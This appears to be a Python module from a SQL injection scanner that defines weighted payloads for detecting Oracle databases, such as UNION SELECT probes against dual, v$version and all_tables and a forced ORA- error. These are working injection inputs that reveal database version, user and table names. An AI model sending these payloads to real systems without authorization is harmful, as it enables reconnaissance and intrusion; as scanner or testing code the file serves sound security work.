# app/modules/scanner/payloads.py
"""
SQL injection payload definitions for Oracle detection.
"""

from dataclasses import dataclass
from typing import List, Dict, Optional


@dataclass
class DetectionPayload:
    """Structure for detection payloads with metadata."""

    payload: str
    description: str
    weight: int
    success_indicator: str


class OracleDetectionPayloads:
    """Oracle-specific detection payloads for Phase 1."""

    def __init__(self):
        self.payloads: List[DetectionPayload] = [
            # Dual table detection - Oracle-specific
            DetectionPayload(
                payload="' UNION SELECT NULL FROM dual--",
                description="FROM dual syntax test",
                weight=15,
                success_indicator="dual",
            ),
            DetectionPayload(
                payload="' UNION SELECT 'Oracle' FROM dual--",
                description="FROM dual with string",
                weight=15,
                success_indicator="Oracle",
            ),
            # Version extraction
            DetectionPayload(
                payload="' UNION SELECT banner FROM v$version--",
                description="v$version table access",
                weight=30,
                success_indicator="Oracle",
            ),
            DetectionPayload(
                payload="' UNION SELECT banner,NULL FROM v$version--",
                description="v$version with NULL",
                weight=25,
                success_indicator="Oracle",
            ),
            # Oracle-specific error generation
            DetectionPayload(
                payload="' AND 1=TO_NUMBER('test')--",
                description="Oracle error generation",
                weight=20,
                success_indicator="ORA-",
            ),
            # Oracle system tables
            DetectionPayload(
                payload="' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--",
                description="all_tables access",
                weight=20,
                success_indicator="TABLE",
            ),
            # Oracle-specific functions
            DetectionPayload(
                payload="' AND ROWNUM=1--",
                description="ROWNUM test",
                weight=10,
                success_indicator="",
            ),
            DetectionPayload(
                payload="' UNION SELECT USER FROM dual--",
                description="USER function test",
                weight=15,
                success_indicator="",
            ),
            # Oracle date functions
            DetectionPayload(
                payload="' UNION SELECT SYSDATE FROM dual--",
                description="SYSDATE function test",
                weight=10,
                success_indicator="",
            ),
        ]

    def get_all_payloads(self) -> List[DetectionPayload]:
        """Return all detection payloads."""
        return self.payloads

    def get_payloads_by_weight(self, min_weight: int = 10) -> List[DetectionPayload]:
        """Get payloads with weight >= min_weight."""
        return [p for p in self.payloads if p.weight >= min_weight]
